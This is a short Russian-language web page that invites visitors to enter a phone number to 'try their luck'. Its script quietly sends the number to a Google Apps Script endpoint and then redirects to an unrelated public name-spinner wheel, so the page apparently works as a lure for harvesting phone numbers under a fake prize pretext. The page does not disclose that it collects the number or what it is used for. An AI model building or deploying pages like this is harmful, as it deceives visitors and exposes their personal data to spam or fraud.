<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Испытай удачу!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #ffecd2 0%, #fcb69f 100%);
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin: 0;
        }
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        input {
            width: 80%;
            max-width: 300px;
            padding: 12px;
            font-size: 18px;
            border: 2px solid #ffa07a;
            border-radius: 8px;
            outline: none;
            text-align: center;
            margin-bottom: 20px;
        }
        button {
            padding: 15px 25px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            background-color: #ff7f50;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #ff6347;
        }
    </style>
</head>
<body>

    <h2>Введите номер телефона и испытайте удачу!</h2>
    <form id="luckForm">
        <input type="tel" id="phone" value="+7" required>
        <button type="submit">Испытать удачу</button>
    </form>

    <script>
        document.getElementById('luckForm').addEventListener('submit', function(e){
            e.preventDefault();

            const phoneInput = document.getElementById('phone');
            const phone = phoneInput.value.trim();

            if (phone.length <= 2) {
                alert('Пожалуйста, введите номер телефона.');
                return;
            }

            fetch('https://script.google.com/macros/s/AKfycbwtH5z-Rgw969sfNRhUK_gF795xggaeiGlhusu08ex9drSQB02dkhxGgc45NWiKWow/exec', {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone})
            });

            // Перенаправляем пользователя сразу после отправки
            window.location.href = 'https://wheelofnames.com/ru/w62-ff6';
        });
    </script>

</body>
</html>
